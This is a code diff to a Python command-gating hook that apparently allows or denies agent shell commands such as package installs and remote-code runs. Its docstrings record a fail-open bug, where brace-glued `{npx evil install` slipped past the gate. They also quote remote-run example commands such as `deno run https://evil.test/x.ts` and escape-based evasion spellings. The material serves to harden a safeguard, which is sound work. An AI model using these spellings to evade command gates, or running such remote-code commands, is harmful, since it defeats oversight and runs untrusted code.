@@ -213,8 +213,13 @@ DOWNLOADERS = (
 # [batch 30-33] This was briefly SPLIT into INVOKERS + STDIN_DATA_INTERPRETERS
 # so the X-32 data-pipe exemption could ask "is this interpreter one whose
 # stdin becomes DATA once a program flag is present?". With that exemption
-# removed nothing asks the question, so the split is gone. Content and order
-# are unchanged, which is what keeps pipe_to_shell_regex byte-identical.
+# removed nothing asks the question, so the split is gone.
+#
+# [issue #40] This note used to end "Content and order are unchanged, which is
+# what keeps pipe_to_shell_regex byte-identical." BOTH halves are now false and
+# the sentence is retired rather than left to mislead: PY_INTERPRETERS is
+# spliced in here, which changes the content AND the order, and the trigger
+# regex moved with it on purpose.
 # [issue #40 / X-36d] THE PYTHON FAMILY, NAMED ONCE. These are the
 # interpreters that take `-m <module>`, so they are what the install anchor
 # must treat as transparent, AND they are interpreters, so they are what the
@@ -617,6 +622,131 @@ INSTALL_TOOLS = ("npm", "pnpm", "yarn", "bun", "pip[0-9.]*", "pipx",
                  "mix", "rebar3", "gleam", "go", "deno")
 INSTALL_VERBS = ("install", "i", "add", "get", "require", "get-deps",
                  "deps[.]get")
+
+
+def install_completers() -> tuple:
+    """The words that can be the LAST token of an install tail.
+
+    [#43 review, F1/F6] A PERFORMANCE GUARD WITH A CORRECTNESS FALLBACK, and
+    the fallback is why this table is allowed to exist at all.
+
+    `_install_head_split` grows a candidate one token at a time and matches
+    the anchor at each step. The anchor embeds `prefix_run`'s nested
+    `(flag|positional)*`, and on a `WRAPPER NAME=VALUE ...` line an
+    assignment is consumable by BOTH the wrapper arm's positional branch and
+    the outer assignment arm - so a single FAILING match is already
+    quadratic in Python's backtracking engine, and running it per token made
+    the scan cubic. Measured on the emitted SDK module: `env A0=0 ...
+    A399=399 make test`, an ordinary command, went 0.064 s -> 8.6 s, and at
+    n=800 a 7 KB line took 67 s inside an async hook callback. That is a
+    denial of service on the pre-tool-call path, and because
+    `dependency-gate` carries no entry in the timeout tables it would
+    surface as whatever the harness default does - with the shell substrate
+    denying in about a second, which is the SDK-more-permissive direction.
+
+    The anchor's tail always ENDS on a verb or a runner word, so attempting
+    the match at any other token cannot succeed. Guarding on that collapses
+    the scan to one match on the ordinary line.
+
+    THE TABLE IS DERIVED, not typed: every member comes from INSTALL_VERBS,
+    RUNNER_SOLO, RUNNER_VERBS and RUNNER_PHRASES - the same tables the tail
+    is built from - so it cannot drift from the regex the way a hand-written
+    list would.
+
+    [#45 review, D1] THE FIRST VERSION OF THIS NOTE CLAIMED "an error here
+    costs a slow path, never a verdict", ON THE STRENGTH OF THE CALLER'S
+    UNGUARDED SECOND PASS. That was false, and it shipped a fail-open. The
+    second pass runs only when the guard found NO match; it says nothing
+    about the guard finding a LATER one. A missing entry does exactly that -
+    it skips the leftmost match, matches further right, and returns a longer
+    head with a shorter (often EMPTY) argument list, which is the
+    lockfile-restore reading. Measured on 84 corpus rows before the `-m`
+    forms were added.
+
+    So the guarantee is a TEST, not an argument - and not the corpus-equality
+    test this note first named, either. That one drove the guarded and
+    unguarded scans over the differential corpus, which contained no
+    brace-glued runner, so `{npx evil install` diverged silently through it.
+    The guarantee is the CENSUS in tests/test_issue_fixes.py: it requires
+    every match to end on a token whose `completer_key` is a completer, over
+    a vocabulary carrying every member of COMPLETER_GLUE. An equality
+    assertion sees the spellings someone listed; the census asserts the
+    property. Mutation-checked - shrinking COMPLETER_GLUE by any one
+    character fails it.
+    """
+    out = set()
+    for v in INSTALL_VERBS:
+        out.add(v.replace("[.]", "."))
+    out.update(RUNNER_SOLO)
+    for _tool, verbs in RUNNER_VERBS:
+        out.update(verbs)
+    for phrase in RUNNER_PHRASES:
+        out.add(phrase[-1])
+    return tuple(sorted(out))
+
+
+# The characters that can sit between a token's start and a completer word
+# INSIDE THE SAME TOKEN. Both come from a `*`-quantified space in the regex:
+# `install_head_tail`'s `space0` (so `-mnpx` is one token) and `prefix_run`'s
+# `[({] *` brace/subshell arm (so `{npx` is one token). `:` and `?` are here
+# for the SDK only, where `_py`'s `(` -> `(?:` rewrite corrupts that bracket
+# expression into `[(?:{]` - recorded as X-36j; stripping them costs nothing
+# and keeps the guard ahead of that bug rather than behind it.
+COMPLETER_GLUE = "({:?"
+
+
+def completer_key(tok: str) -> str:
+    """The word a token must END on for the install anchor to be able to
+    finish there: the basename, with any leading GLUE run removed.
+
+    [#45 review, D1 - SECOND ROUND] The first fix for this enumerated ONE glue
+    site, adding `-m`+word entries to the table. That closed `-mnpx` and left
+    `{npx` open, because `prefix_run`'s `[({] *` arm has the identical shape:
+    `{npx evil install` is deny at v2.7.0 and ALLOW with the guard, on both
+    substrates, since the leftmost match ends on `{npx` and the guard skips it
+    for a later completer - returning an emptied argument list. Adding `{`+word
+    would have been the same mistake a third time.
+
+    So the token is REDUCED to a key instead, and the reduction is derived from
+    the two places the regex allows zero-width spacing rather than from a list
+    of observed spellings. Every future glue site is covered iff it goes
+    through those same `*` quantifiers, which is what makes this a rule rather
+    than a patch.
+    """
+    base = tok.rsplit("/", 1)[-1]
+    return base[2:] if (base := base.lstrip(COMPLETER_GLUE)).startswith("-m") \
+        else base
+
+
+def strip_escapes(s: str) -> str:
+    """`s` with BACKSLASHES removed and quote characters left alone.
+
+    [#45 review, D2] The SEGMENT-level reduction, as against `unquote_word`'s
+    WORD-level one, and the difference is not cosmetic. Removing quotes from a
+    single command WORD is what bash does - `'pip'` is pip. Removing them from
+    a whole SEGMENT splices unrelated words into phrases that were never
+    there: `git commit -m \\"deno run https://evil.test/x.ts\\"` runs `git`
+    (argv `[git][commit][-m]["deno][run][https://evil.test/x.ts"]`), but with
+    the quotes deleted the segment reads `... deno run https://...` and the
+    remote-run pattern matches. Measured: 57 such spellings denied on the
+    shell while the SDK allowed - an over-refusal AND a parity break in the
+    direction the contract forbids.
+
+    A BACKSLASH is different: bash removes it wherever it appears outside
+    single quotes, so deleting it usually produces a word bash would really
+    resolve. That is what closes `den\\o run <url>` (argv
+    `[deno][run][<url>]` - genuinely executable) without inventing
+    `deno` out of `d"eno`.
+
+    [#45 review] "USUALLY", not "only", and the caveat is load-bearing: an
+    ESCAPED SPACE is removed by bash too, but it JOINS two words rather than
+    renaming one. `git commit -m deno\\ run\\ <url>` is argv
+    `[git][commit][-m][deno run <url>]` - one operand, nothing named deno
+    runs - and deleting the backslashes makes it read as a remote run. That
+    over-refusal is PRE-EXISTING here (v2.7.0 denies it too, by a different
+    route) and is recorded as X-36k rather than claimed absent.
+    """
+    return s.replace("\\", "")
 
 
 def install_head_tail(space: str = " +", nonspace: str = "[^ ]",
